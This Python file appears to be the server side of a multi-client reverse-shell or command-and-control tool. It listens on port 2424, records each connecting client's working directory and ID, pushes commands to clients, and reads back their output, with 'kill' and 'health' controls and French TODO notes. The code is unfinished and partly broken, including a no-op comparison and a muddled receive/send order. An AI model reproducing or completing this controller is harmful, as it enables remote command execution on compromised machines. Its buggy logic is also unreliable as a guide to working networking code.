import socket
import threading
import time
import multiprocessing
import os

import Interface as Itf


class SocketHandler:  # TODO COMPLETE REWORK

    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.connection_list = []
        self.health = None


    def handle(self):
        # create a socket object
        sock = socket.socket()
        # bind the socket to all IP addresses of this host
        sock.bind((self.server_host, self.server_port))
        sock.listen(5)
        while True:
            # accept any connections attempted
            client_sock, client_ip = sock.accept()
            current_client = ClientHandler(client_sock, client_ip)
            self.connection_list.append([current_client, None, None])

    def looker(self):
        # TODO
'''
1 : valider les connection courante (voir si elles ont ete manage)
2 : Starter les thread
2.5 : Sett old connection to active if was allready connected (SI elles ses deja connecter reconnecter ou elle etait dans la liste)
SE RAPPELER DES CONNECTIONS QUI ONT DROPER
3 : valider HEALTH
4 : KILL connection AND thread if none healthy
5 : posmal so et surement le renommer (genre connection_handller ou de meme )
6 : potentiellement regarder solution pour la connection list /alternative
7 : regarder pour fusionner avec fonction du dessus
8 : peut etre avec des events pour les list
'''
        #__con_lst = []  # Private look up table
        #while True:
        #    # Compare connection_list with expected connection
        #    if not __con_lst == self.connection_list:  # Todo handle this better (?event?)
        #        for i in range(len(self.connection_list)): # Todo  retirer dead de connection_list
        #            elem = self.connection_list[i]
        #            if not __con_lst.__contains__(elem[0]):
        #                # Todo make sure all thread are generated at the same place
        #                elem[2] = threading.Thread(target=elem[0].handle).start()
        #                elem[1] = threading.Thread(target=elem[0].health_status).start()
#
        #                __con_lst.append(elem[0])
        #                self.connection_list[i] = elem





class ClientHandler:  # TODO COMPLETE REWORK

    def __init__(self, socket, ip):
        self.ENCODING = 'utf-8'
        self.BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
        self.SEPARATOR = "<sep>"  # separator string for sending 2 messages in one go
        self.socket = socket
        self.ip = ip
        self.command = ''
        self.current_dir = ''
        self.last_response = ''

        self.id = None
        self.health = None

    def handle(self):

        # receiving the current working directory of the client
        self.current_dir, self.id = self.socket.recv(self.BUFFER_SIZE) \
            .decode(encoding=self.ENCODING).split(self.SEPARATOR)

        while True:
            self.health_status()
            # command = input(f'{current_dir} $> ')
            if not self.command:  # look if a command have been push
                time.sleep(1)
                continue  # noting to do


            if self.command.lower() == 'kill':
                self.health = False
                print(self.health)
                break  # ...then if the command is exit, just break out of the loop

            # retrieve command results then split command output and current directory
            if self.command.lower() == 'health':
                try:
                    self.health = self.socket.recv(self.BUFFER_SIZE).decode(encoding=self.ENCODING).split(self.SEPARATOR)
                    self.health == bool(self.health)
                    if self.health :
                        continue
                except :
                    print("no answer connection dead")
                    self.health = False
                continue
            self.last_response, self.current_dir, self.id = self.socket.recv(self.BUFFER_SIZE) \
                .decode(encoding=self.ENCODING).split(self.SEPARATOR)

            # send the command to the client...
            self.socket.send((self.command.encode()))

    def health_status(self):
        try:
            self.command = 'Health'
            self.health = self.last_response
        except :
            self.command = 'kill'






    def close(self):
        self.socket.close()  # close server connection




if __name__ == '__main__':
    multiprocessing.set_start_method('spawn', force=True)
    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 2424

    sock_handler = SocketHandler(server_host=SERVER_HOST, server_port=SERVER_PORT)
    cli_handler = Itf.Cli(sock_handler)



    # TODO handle thread in any other way seriously
    threading.Thread(target=sock_handler.looker).start()
    threading.Thread(target=sock_handler.handle).start()
    threading.Thread(target=cli_handler.handle).start()

